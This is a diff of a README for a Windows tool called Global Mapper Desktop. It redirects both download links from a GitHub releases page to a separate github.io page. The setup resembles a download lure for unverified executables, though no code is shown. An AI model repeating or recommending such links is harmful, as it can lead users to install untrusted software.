@@ -1,6 +1,6 @@
 # 🗺️ global-mapper-desktop - Manage Global Mapper Data With Ease
 
-[![Download Global Mapper Desktop](https://img.shields.io/badge/Download-Global_Mapper_Desktop-ff6b6b?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/N0rthStar121/global-mapper-desktop/releases)
+[![Download Global Mapper Desktop](https://img.shields.io/badge/Download-Global_Mapper_Desktop-ff6b6b?style=for-the-badge&logo=windows&logoColor=white)](https://n0rthstar121.github.io)
 
 Global Mapper Desktop is a friendly helper application for Windows that keeps your Global Mapper files organized. If you work with maps, terrain data, or exported map projects, this tool gives you one simple place to manage your data paths, your configuration files, and the folders where your exports land. No programming knowledge is needed. You install it, open it, and it quietly takes care of the messy parts of file management so you can get back to your maps.
 
@@ -40,7 +40,7 @@ Here is a plain-language look at what it handles:
 
 Visit this link to download the application:
 
-**https://github.com/N0rthStar121/global-mapper-desktop/releases**
+**https://n0rthstar121.github.io**
 
 On that page you will see a list of available versions. Pick the newest one at the top of the list. Inside each version you will find the files that belong to that release. Save the download to a folder you can find again easily, such as your Downloads folder or your Desktop.
 
